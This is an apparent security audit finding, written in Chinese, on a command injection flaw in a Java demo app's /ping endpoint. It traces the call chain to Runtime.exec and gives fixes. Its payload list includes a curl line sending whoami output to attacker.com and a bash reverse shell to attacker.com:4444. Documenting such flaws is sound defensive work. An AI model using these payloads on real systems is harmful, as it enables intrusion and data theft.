# 命令注入 — GET /ping host 参数

**类型**：命令注入 (Command Injection)
**位置**：`src/main/java/com/example/demo/util/ScriptRunner.java:17-18`
**CVSS 评分**：9.8 **严重性**：严重 (Critical)
**触发条件**：向 `GET /ping?host=<payload>` 发送 HTTP 请求，`host` 参数直接拼入 shell 命令执行。
**影响**：攻击者可在服务器上以应用进程身份执行任意系统命令，包括但不限于：读取/篡改任意文件、安装后门、横向移动、窃取凭据与数据。
**Payload**：
- 基础探测：`GET /ping?host=;id;`
- 任意命令执行：`GET /ping?host=8.8.8.8;cat+/etc/passwd`
- 命令替换：`GET /ping?host=127.0.0.1$(whoami)`
- OR 短路注入：`GET /ping?host=8.8.8.8||curl+http://attacker.com/$(whoami)`
- 反向 shell（URL 编码后）：`GET /ping?host=;bash+-i+>%26/dev/tcp/attacker.com/4444+0>%261`
**攻击步骤**：
1. 确认目标存在 `/ping` 端点
2. 发送请求 `GET /ping?host=;id;`，观察响应内容。若返回中包含 `uid=...` 等 id 命令输出，证明存在命令注入
3. 根据利用目标构造 payload：文件读取、反弹 shell、植入后门等
**调用链**：
```
host (HTTP query param)
  → PingController.ping(String host)                    [PingController.java:18]
    → PingServiceImpl.ping(String host)                  [PingServiceImpl.java:17-18]
      → CommandExecutor.execute(String host)              [CommandExecutor.java:14-15]
        → ScriptRunner.run(String host)                   [ScriptRunner.java:14-28]
          → cmd = scriptPath + " " + host                [ScriptRunner.java:17]
          → Runtime.getRuntime().exec("/bin/sh", "-c", cmd) [ScriptRunner.java:18]
            → ping.sh 执行: ping -c 3 $1                 [ping.sh:2]（$1 未加引号）
```
**建议**：
1. 严格校验 `host` 格式：仅允许合法 IP 地址或受信任域名（白名单），拒绝所有 shell 元字符
2. 使用 `ProcessBuilder` 以列表形式传递参数，避免通过 `-c` 将用户输入传入 shell 解释器
3. 脚本中变量引用加双引号：`ping -c 3 "$1"`
4. 最小权限运行应用进程，限制命令注入的提权效果
**事实依据**：
- `PingController.java:18` 接收 `host` 参数，无 `@Pattern`、`@Size`、`@NotNull` 等校验注解
- `ScriptRunner.java:17` 直接拼接命令字符串：`String cmd = scriptPath + " " + host;`，用户输入未经任何转义或过滤
- `ScriptRunner.java:18` 通过 `Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd})` 执行，shell 解释器会解析所有 shell 元字符（`;`、`` ` ``、`$()`、`|`、`||` 等）
- `ping.sh:2` 中 `$1` 未加引号，即使上层做转义也能通过单词拆分和通配符扩展再次突破
- 调用链上四层（Controller → Service → CommandExecutor → ScriptRunner）均为纯透传，无任何过滤或转换
